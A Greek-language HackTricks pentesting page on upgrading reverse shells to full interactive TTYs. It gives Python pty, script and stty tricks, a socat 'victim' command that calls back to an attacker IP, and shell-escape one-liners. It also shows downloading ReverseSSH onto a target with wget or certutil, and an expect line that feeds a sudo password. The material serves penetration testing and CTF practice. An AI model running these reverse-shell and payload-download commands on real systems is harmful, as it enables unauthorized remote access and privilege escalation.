# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Το `/etc/shells` παραθέτει έγκυρα pathnames login-shell και χρησιμοποιείται από ορισμένα προγράμματα· δεν αποτελεί καθολική προϋπόθεση για την εκχώρηση ενός PTY.<sup>[[3]](#references)[[4]](#references)</sup> Αν ένα πρόγραμμα όπως το `pkexec` απορρίπτει το `SHELL` με το μήνυμα `The value for the SHELL variable was not found in the /etc/shells file`, βεβαιωθείτε ότι το ακριβές path του shell (για παράδειγμα, `/bin/bash`) εμφανίζεται στο `/etc/shells`.<sup>[[10]](#references)</sup> Η παρακάτω ακολουθία ανάκτησης `CTRL+Z`/`fg` χρησιμοποιεί Bash job control· αν το τρέχον shell δεν είναι Bash, ξεκινήστε το Bash πριν χρησιμοποιήσετε αυτή την ακολουθία.<sup>[[7]](#references)</sup>

#### Python

Το `pty.spawn` της Python εκκινεί ένα πρόγραμμα συνδεδεμένο με τα standard input, output και error streams της τρέχουσας διεργασίας, παρέχοντας στο Bash ένα pseudo-terminal σε αυτή τη session.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Μπορείτε να βρείτε τον **αριθμό** των **γραμμών** και των **στηλών** εκτελώντας **`stty -a`**· το `-a` εμφανίζει όλες τις τρέχουσες ρυθμίσεις του terminal. Η έξοδος της εντολής εξαρτάται από το terminal, επομένως χρησιμοποιήστε τις τιμές που αναφέρονται από την τρέχουσα session.<sup>[[11]](#references)</sup>

#### script

Το utility `script` καταγράφει μια session του terminal· εδώ, το `/dev/null` απορρίπτει το typescript, το `-q` αποκρύπτει τα μηνύματα έναρξης και ολοκλήρωσης και το `-c` εκτελεί το Bash αντί για το default shell.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Μετά από οποιαδήποτε μέθοδο PTY-spawn, αναστείλετε τη συνεδρία Netcat και επαναφέρετέ την με local raw mode, και στη συνέχεια ορίστε το περιβάλλον και τις διαστάσεις του remote terminal:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Ο listener χρησιμοποιεί το τρέχον terminal σε raw mode με απενεργοποιημένο local echo και αποδέχεται TCP συνδέσεις στη θύρα 4444. Η εντολή του victim εκχωρεί ένα pty, ενώνει το stderr, δημιουργεί μια session, προωθεί το SIGINT και εφαρμόζει sane terminal settings· προσθέστε `ctty` αν το child χρειάζεται controlling terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Δημιουργία shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (παλιές εκδόσεις με `--interactive`): `!sh`

Το escape του Nmap εξαρτάται από την έκδοση: το Nmap αφαίρεσε τη λειτουργία `--interactive` σε μεταγενέστερες εκδόσεις, επομένως το `!sh` ισχύει μόνο για παλιές εκδόσεις.<sup>[[13]](#references)</sup>

## ReverseSSH

Ένας πρακτικός τρόπος για **interactive shell access**, καθώς και για **μεταφορές αρχείων** και **port forwarding**, είναι η μεταφόρτωση του statically-linked SSH server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) στον στόχο.<sup>[[1]](#references)</sup>

Παρακάτω υπάρχει ένα παράδειγμα για `x86` με το δημοσιευμένο UPX-compressed binary του project. Για άλλες αρχιτεκτονικές ή release artifacts, χρησιμοποιήστε τη [σελίδα releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) για πλοήγηση.<sup>[[1]](#references)</sup>

1. Προετοιμάστε το local host ώστε να αποδεχτεί την εισερχόμενη σύνδεση SSH. Στη λειτουργία listener, το `-l` ενεργοποιεί τον listener και το `-p 4444` επιλέγει τη θύρα στην οποία αποδέχεται τη σύνδεση του στόχου.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. Μεταφέρετε το ίδιο `upx_reverse-sshx86` artifact στο `/dev/shm/reverse-ssh` και κάντε το executable. Το `-p 4444` του target επιλέγει τη θύρα του listener παραπάνω, ενώ το `kali@10.0.0.2` παρέχει τον λογαριασμό και το host που χρησιμοποιούνται για τη σύνδεση προς τα πίσω.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Στόχος Windows. Το πλήρως διαδραστικό PowerShell απαιτεί Windows 10 build 17763· δείτε το [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Το παράδειγμα για Windows χρησιμοποιεί το `certutil` με `-f -urlcache`. Η Microsoft τεκμηριώνει το `-f` ως επιλογή που εξαναγκάζει μια ανάκτηση URL και σημειώνει ότι οι διαθέσιμες παράμετροι διαφέρουν ανάλογα με την έκδοση, επομένως ελέγξτε το `certutil -?` αν αυτή η μορφή δεν είναι διαθέσιμη.<sup>[[12]](#references)</sup>

- Μετά την επιτυχή reverse σύνδεση, ο listener του ReverseSSH σε reverse-mode κάνει bind στη θύρα `8888` από προεπιλογή (ή στην τιμή που παρέχεται με το `-b`), και οι εισερχόμενες συνδέσεις δέχονται οποιοδήποτε username με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls`. Το remote shell εκτελείται με τα δικαιώματα του λογαριασμού που εκκίνησε το `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

Το [Penelope](https://github.com/brightio/penelope) αναβαθμίζει αυτόματα τα Unix-like reverse shells σε PTY, αλλάζει το μέγεθος των Unix-like terminals και καταγράφει τις αλληλεπιδράσεις με το shell· για Windows shells παρέχει readline, αλλά όχι αλλαγή μεγέθους terminal σε πραγματικό χρόνο.<sup>[[2]](#references)</sup>

![Interface χειρισμού reverse shell του Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Εκτελέστε το `penelope` για να ακούει από προεπιλογή στη διεύθυνση `0.0.0.0:4444`· τα εισερχόμενα Unix-like shells μπορούν στη συνέχεια να αναβαθμιστούν και να καταγραφούν αυτόματα.<sup>[[2]](#references)</sup>

![Το Penelope χειρίζεται και αναβαθμίζει ένα εισερχόμενο shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Χωρίς TTY

Αν για κάποιον λόγο δεν μπορείτε να αποκτήσετε πλήρες TTY, **εξακολουθείτε να μπορείτε να αλληλεπιδράσετε με προγράμματα** που περιμένουν input χρήστη. Στο ακόλουθο παράδειγμα, το Expect εκκινεί το `sudo`, περιμένει το prompt του password, στέλνει το password και επιστρέφει τον έλεγχο με το `interact`· το `sudo -S` διαβάζει το password από το standard input. Χρησιμοποιήστε το μόνο σε εξουσιοδοτημένο lab και αποφύγετε να τοποθετείτε πραγματικά credentials στο shell history ή σε source files.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Statically-linked ssh server με reverse shell functionality για CTFs και παρόμοιες περιπτώσεις](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler που αυτοματοποιεί μερικά πράγματα για να κάνει τη ζωή ευκολότερη](https://github.com/brightio/penelope)
- [3] [shells(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Τεκμηρίωση Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Εγχειρίδιο αναφοράς Bash — Έλεγχος εργασιών](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap - Αρχείο αλλαγών](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
